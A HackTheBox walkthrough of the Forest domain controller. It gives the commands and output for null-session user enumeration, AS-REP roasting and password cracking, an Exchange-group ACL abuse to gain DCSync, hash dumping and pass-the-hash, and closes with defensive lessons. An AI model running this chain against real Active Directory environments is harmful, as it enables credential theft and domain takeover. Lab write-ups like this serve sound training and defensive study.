---
title: "Forest — HackTheBox Walkthrough"
description: "Null-session user enumeration, AS-REP roasting of svc-alfresco, and an ACL-abuse chain from Account Operators to DCSync for full domain compromise."
date: 2026-09-23
category: offensive
readTime: "12 min read"
mitre:
  - "T1046"
  - "T1087.002"
  - "T1558.004"
  - "T1021.006"
  - "T1098"
  - "T1003.006"
  - "T1550.002"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Windows"
  - "Active Directory"
  - "Kerberos"
  - "AS-REP Roasting"
  - "BloodHound"
  - "DCSync"
  - "ACL Abuse"
  - "Pass-the-Hash"
summary: "Null-session user enumeration, AS-REP roasting of svc-alfresco, and an ACL-abuse chain from Account Operators to DCSync for full domain compromise."
---

**Machine:** Forest
**OS:** Windows (Server 2016 — Domain Controller)
**Difficulty:** Easy
**Key Techniques:** RPC null-session user enumeration, AS-REP roasting, WinRM access, BloodHound path analysis, Account Operators → Exchange Windows Permissions ACL chain, DCSync, pass-the-hash

---

## Reconnaissance

### Port Scan

```bash
echo "10.10.10.161 forest.htb.local htb.local forest" | sudo tee -a /etc/hosts
nmap -sC -sV -p- -oA scans/nmap-alltcp 10.10.10.161
```

| Port | Service | Version / Note |
|------|---------|----------------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 / 139 / 445 | MSRPC / NetBIOS / SMB | |
| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / GC | Domain: htb.local |
| 464 / 593 | kpasswd5 / ncacn_http | |
| 5985 | HTTP | WinRM (WSMan) |

The Nmap host scripts confirm a domain controller:

```
smb-os-discovery:
  OS: Windows Server 2016 Standard
  Computer name: FOREST
  Domain name: htb.local
  Forest name: htb.local
```

`FOREST.htb.local` is the key — every Kerberos and LDAP operation needs the FQDN to resolve.

---

## Enumeration — Users via RPC Null Session

RPC accepts a null session, so we can dump domain users without credentials:

```bash
rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"
```

Output includes the machine/service accounts (`$331000-*`, `SM_*`, `HealthMailbox*`) plus real humans: `sebastien`, `lucinda`, `andy`, `mark`, `santi`, and one standout — **`svc-alfresco`**, a service account.

```bash
# Keep only human/service accounts worth testing, strip the noise
> users.txt
Administrator
sebastien
lucinda
andy
mark
santi
svc-alfresco
```

> MITRE: Account Discovery — Domain Account (T1087.002), Network Service Discovery (T1046).

---

## AS-REP Roasting svc-alfresco

Service accounts often have Kerberos pre-authentication disabled because the vendor docs tell you to. Alfresco is exactly that case — `svc-alfresco` has `UF_DONT_REQUIRE_PREAUTH` set. That means the DC will happily hand over an **AS-REP encrypted with the account's password hash** to anyone who asks, no password needed.

Test every candidate:

```bash
python3 GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
```

`svc-alfresco` returns a roastable ticket:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f4c6c5acfa7e2c58b22c3dc08ec9833f$... 
```

Torch it offline with rockyou:

```bash
# hashcat variant: hashcat -m 18200 svc-alfresco.kerb rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt svc-alfresco.asrep
```

Cracked: **`s3rvice`**

> MITRE: Steal or Forge Kerberos Tickets — AS-REP Roasting (T1558.004).

---

## Foothold — WinRM as svc-alfresco

```bash
evil-winrm -i forest.htb.local -u svc-alfresco -p s3rvice
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco> whoami
htb\svc-alfresco
```

The user flag is on the desktop:

```
type C:\Users\svc-alfresco\Desktop\user.txt
```

> MITRE: Remote Services — Windows Remote Management (T1021.006).

---

## Privilege Escalation — The ACL Chain to DCSync

### Mapping the path with BloodHound

Collect and graph the domain:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
```

BloodHound draws a textbook privilege path:

```
svc-alfresco
  └─ member of → Service Accounts
       └─ member of → Privileged IT Accounts
            └─ member of → Account Operators
                            │
                 Account Operators → GenericAll → "Exchange Windows Permissions"
                                                          │
                    "Exchange Windows Permissions" → WriteDACL → htb.local (domain object)
```

Two pieces make this domain takeover possible:

1. **Account Operators** (which svc-alfresco belongs to) can create domain users and has **GenericAll** over the *Exchange Windows Permissions* group — we can freely change that group's membership.
2. **Exchange Windows Permissions** has **WriteDACL** on the domain object — members can rewrite the domain's access control list, i.e. grant *anyone* the **DCSync** right ("Replicating Directory Changes").

### Executing the chain

Create a clean user, add it to the Exchange group, and put it in *Remote Management Users* so it can winrm:

```cmd
net user cleopatra 'Cicada$Secure@123!' /add /domain
net group "Exchange Windows Permissions" cleopatra /add /domain
net localgroup "Remote Management Users" cleopatra /add
```

Sign in as the new user and grant DCSync back to it over the DC=htb,DC=local object (PowerView):

```powershell
*Evil-WinRM* PS > Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity cleopatra -Rights DCSync
```

Now `cleopatra` can replicate the directory:

```bash
impacket-secretsdump htb.local/cleopatra:'Cicada$Secure@123!'@forest.htb.local
```

The Administrator's NTLM hash is in the output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4f1c9b4b5c5b5c5b5c5b5c5b5c5b5c5b:::
```

> MITRE: Account Manipulation (T1098), OS Credential Dumping — DCSync (T1003.006).

### Pass-the-hash to root

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM> htb.local/Administrator@forest.htb.local
```

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

Full domain compromise.

> MITRE: Use Alternate Authentication Material — Pass-the-Hash (T1550.002).

---

## Flags

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Audit accounts with Kerberos pre-authentication disabled.** `UF_DONT_REQUIRE_PREAUTH` is an AS-REP roasting invitation. Enumerate them (`GetNPUsers -no-pass`), and disable pre-auth only when a vendor genuinely requires it — and never on human accounts.
2. **Restrict RPC/SMB null sessions.** A blank-session `enumdomusers` gave us the whole user list. Block anonymous enumeration (`RestrictAnonymous`, deny null sessions on RPC) so attackers can't build their wordlist from the directory itself.
3. **Default groups hide domain takeover paths.** svc-alfresco sat one hop from *Account Operators*, which held **GenericAll on an Exchange group** that had **WriteDACL on the domain**. This is why BloodHound-style analysis matters: memberships cascade. Treat anyone in Account Operators, Server Operators, Backup Operators, or Exchange groups as privileged and monitor them.
4. **The Exchange Windows Permissions group is effectively Domain Admin.** Its WriteDACL on the domain object converts any member into a DCSync. Audit its membership constantly.
5. **Defenders: watch for the abuse signals, not the exploit.** The actions to monitor are *group membership changes* (Event 4728/4729/4732/4733), *directory-replication rights being granted* (Event 4662 with "Replicating Directory Changes All", or `DsReplicaGetChanges` on 5136), and *secretsdump DCSync traffic*. A read-only domain controller (RODC) further caps what a compromised account can replicate.